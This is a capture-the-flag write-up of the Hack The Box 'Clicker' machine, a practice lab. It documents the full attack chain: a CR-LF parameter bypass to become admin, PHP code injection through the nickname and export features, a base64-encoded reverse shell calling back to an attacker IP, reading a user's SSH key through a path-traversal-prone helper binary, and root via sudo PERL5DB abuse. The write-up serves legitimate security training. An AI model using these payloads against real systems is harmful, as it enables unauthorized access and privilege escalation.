---
slug: /write-up/htb/medium/clicker
pagination_next: null
pagination_prev: null
---

## Enumeration

The machine has a NFS share sharing the source code

Checking the source code we see a potential SQL injection following a similar pattern of this:

https://phpdelusions.net/pdo/sql_injection_example

curl -vv 'http://clicker.htb/save_game.php?clicks=0&level=0&nickname=blabla' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh'

We can arbirtraryly change key-values in the database in the query, however, there's a explicit check to try to change the role:

```php
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
```

## Foothold

In order to avoid this, we need to mask the key somehow, an idea can be to bypass that restriction using CR-LF injection:

```bash
curl -vv 'http://clicker.htb/save_game.php?role%0a=Admin' -H 'Cookie: PHPSESSID=k002rk00q1d5v73c3nvjgabeie'
```

Now, we are admin in the PHP application and we can perform more enumerations.

We discovered some interesting pages:
- admin.php: Generates a list with the top users.
- export.php: Generate a file `exports/top_players_fwhb6q51`, no more info. Maybe it's good to do user enumeration?
- diagnostic.php: Protected by a md5 token

We can access the generated files by the exporting function...
```bash
curl -vv 'http://clicker.htb/export.php' -X POST  -H 'Content-Type: application/x-www-form-urlencoded'  -H 'Cookie: PHPSESSID=k002rk00q1d5v73c3nvjgabeie' --data-raw 'threshold=0&extension=html'
```

We can change the extension to PHP. 

```bash
curl -vv 'http://clicker.htb/export.php' -X POST  -H 'Content-Type: application/x-www-form-urlencoded'  -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh' --data-raw 'threshold=0&extension=php'
```

We can change the nickname of the user to execute arbitrary PHP code. We'll change the nickname to make execute the following PHP code:

```php
<?php $output = exec('id');echo "$output";?>
```

```bash
curl -vv 'http://clicker.htb/save_game.php?clicks=0&level=0&nickname=%3C%3Fphp%20echo%20%221234%22%3B%3F%3E' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh'
```

Now we can repeat the process but to run a reverse shell:

```php
<?php system("echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjAvNDQ0NCAwPiYx|base64 -d|bash")?>
```

```bash
curl -vv 'http://clicker.htb/save_game.php?clicks=0&level=0&nickname=%3C%3Fphp%20system%28%22echo%20c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjAvNDQ0NCAwPiYx%7Cbase64%20-d%7Cbash%22%29%3F%3E' -H 'Cookie: PHPSESSID=pbf2159gsu1kit0bmttdh28bmh'
```

We get a shell for the user www-data. We discovered a user named `jack` by checking /etc/passwd

## Lateral movement

During enumeration we discover there are two files in `/opt` files:

- monitor.sh: script that downloads the output of diagnostic.php, the user needs to be root
- manage/README
- manage/executequery: binary file that setup up all the environment

Let's download it and analyse it using `ghidra` ...

```c
    iVar1 = atoi(*(char **)(param_2 + 8));
    pcVar3 = (char *)calloc(0x14,1);
    switch(iVar1) {
    case 0:
      puts("ERROR: Invalid arguments");
      uVar2 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(pcVar3,"create.sql",0x14);
      break;
    case 2:
      strncpy(pcVar3,"populate.sql",0x14);
      break;
    case 3:
      strncpy(pcVar3,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(pcVar3,"clean.sql",0x14);
      break;
    default:
      strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);
    }
```
There's a default option that would copy any provided value in param_2 into `pcVar3`

```c
    local_98 = 0x616a2f656d6f682f;
    local_90 = 0x69726575712f6b63;
    local_88 = 0x2f7365;
    sVar4 = strlen((char *)&local_98);
    sVar5 = strlen(pcVar3);
    __dest = (char *)calloc(sVar5 + sVar4 + 1,1);
    strcat(__dest,(char *)&local_98);
    strcat(__dest,pcVar3);
    setreuid(1000,1000);
    iVar1 = access(__dest,4);
    if (iVar1 == 0) {
      local_78 = 0x6e69622f7273752f;
      local_70 = 0x2d206c7173796d2f;
```

`local_98` value corresponds to the string `/home/jack`. So, what it's doing this program is forcing the provided file is inside `/home/jack` folder, which we don't have access. However, we can read the private SSH key with this mechanism:

```bash
www-data@clicker:/opt/manage$ ./execute_query 5 ../.ssh/id_rsa
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
```

Now we just need to adapt the private key format comparing with some valid private key and boom, we are in as `jack`:

```bash
ssh jack@clicker.htb -i ../exfil/priv_key 
```

And we can read the user flag.

## Privilege escalation

`sudo -l` shows interesting stuff:

```bash
User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```

First of all, we try to run the monitoring script to see what happens:

```bash
jack@clicker:~$ sudo /opt/monitor.sh 
<?xml version="1.0"?>
<data>
```

An potential way to exploit this, is set the `EUID` to a number different than 0 so that it enters in the if when the user is not root:

```bash
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;
```

The PATH is not well protected and if we provide the proper PATH variable, we can make `echo` program to point to our fradulent implementation ... Let's give it a try ...

Interesting, this technique does not seem to work with `echo` for some kind of reason but work with `ls` for instance. Looks like `echo` is a bult-in executable in the shell and does not use the `PATH` variable to determine where is it.

We can use `PERL5OPT` to set the debugger flag for perl and `PERL5DB` to specify the command we want to use as a debugger:

```bash
jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system("ls");' /opt/monitor.sh 
queries  user.txt
```

However, if we try to get a shell from here, we'll fail:

```
jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system("/bin/bash");' /opt/monitor.sh 
/bin/bash: line 1: syntax error near unexpected token `newline'
/bin/bash: line 1: `<?xml version="1.0"?>'
No DB::DB routine defined at /usr/bin/xml_pp line 9.
No DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870.
END failed--call queue aborted.
```

But, we can do a nasty thing, we can set the SUID flag so that if keeps the root permission, even if the user is not root:

```bash
sudo PERL5OPT=-d PERL5DB='system("chmod u+s /bin/bash");' /opt/monitor.sh

jack@clicker:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

If we run bash normally we'll not get the root console:

```bash
jack@clicker:~$ bash
bash-5.1$ whoami
jack
```

However, there's a flag `-p` in bash to use the effective user id instead of the real user id:

```bash
jack@clicker:~$ bash -p
bash-5.1# whoami
root
```

And now we can read the root flag.